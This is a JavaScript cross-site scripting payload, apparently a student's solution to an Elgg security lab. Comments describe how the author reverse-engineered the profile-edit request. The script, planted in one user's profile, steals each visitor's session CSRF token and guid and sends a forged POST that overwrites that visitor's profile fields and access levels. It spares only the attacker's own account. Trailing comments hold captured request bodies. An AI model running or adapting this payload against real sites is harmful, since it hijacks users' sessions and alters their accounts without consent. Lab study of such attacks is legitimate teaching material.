
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token

    
// At first ,after logging in with a account(say Alice) ,I clicked edit profile and changed a accesibility to
// "logged in users" from public and changed the value of the field. I got a "post" request in the network tab.
// I saw the requestbody and thus realized the request url.FInally I incorporated my logic to make
// everythings accesibility "logged in users"(which is accesibility=1).

// FInally to make sure Samy doesnot get affected by the code,I used a if condition to check if the 
// person vsiting samy's profile was not Samy himself.


    var name=elgg.session.user.name;
    if(name!="Samy")
    {
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var guid=elgg.session.user.guid;
        var description = "&description=1605022" + "&accesslevel[description]=1";
        description+="&briefdescription=Bhallagena Mara Jabo" + "&accesslevel[briefdescription]=1";
        description+="&contactemail=1605022@ugrad.cse.buet.ac.bd" + "&accesslevel[contactemail]=1";
        description+="&location=Bhallagena Mara Jabo" + "&accesslevel[location]=1";
        description+="&interests=Bhallagena Mara Jabo" + "&accesslevel[interests]=1";
        description+="&mobile=123" + "&accesslevel[mobile]=1";
        description+="&phone=1234" + "&accesslevel[phone]=1";
        description+="&skills=Bhallagena Mara Jabo" + "&accesslevel[skills]=1";
        description+="&twitter=Bhallagena Mara Jabo" + "&accesslevel[twitter]=1";
        description+="&website=http://Bhallagena Mara Jabo.com" + "&accesslevel[website]=1";

        var sendurl="http://www.xsslabelgg.com/action/profile/edit";

        var content=token+ts+name+description+"&guid="+guid;

        var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);


    }




//     __elgg_token	mEIGvvb_bDffz2xuLsa1AA
// __elgg_ts	1624202526
// accesslevel[briefdescription]	2
// accesslevel[contactemail]	2
// accesslevel[description]	2
// accesslevel[interests]	2
// accesslevel[location]	2
// accesslevel[mobile]	2
// accesslevel[phone]	2
// accesslevel[skills]	2
// accesslevel[twitter]	2
// accesslevel[website]	2
// briefdescription	
// contactemail	
// description	<p>bal</p>
// guid	44
// interests	
// location	
// mobile	
// name	Alice
// phone	
// skills	
// twitter	
// website	


  

	

 //__elgg_token=xr1OEdFmatLc4GPGNPgsRA&__elgg_ts=1624200559&name=Alice&description=%3Cp%3Ebal%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=44
}	
	
</script>